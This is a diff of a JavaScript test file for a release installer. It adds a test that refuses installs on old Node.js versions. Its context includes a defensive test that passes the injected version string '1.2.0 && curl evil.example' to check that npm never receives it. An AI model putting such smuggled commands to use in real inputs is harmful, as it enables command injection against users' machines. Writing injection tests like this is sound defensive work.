@@ -91,6 +91,17 @@ test('a failed update says why and leaves the running worker as it is', async ()
   }
 });
 
+test('an older Node.js is refused before npm replaces the installed release', () => {
+  const { run, calls } = fakeRun();
+  const installed = installRelease(installer, '1.2.0', { spawn: run, node: '18.19.1' });
+  assert.equal(installed.ok, false);
+  assert.match(
+    installed.ok ? '' : installed.error,
+    /needs Node\.js 24 or later, and this machine runs 18\.19\.1/,
+  );
+  assert.deepEqual(calls, []);
+});
+
 test('npm is never handed something that is not a release', () => {
   const { run, calls } = fakeRun();
   const installed = installRelease(installer, '1.2.0 && curl evil.example', { spawn: run });
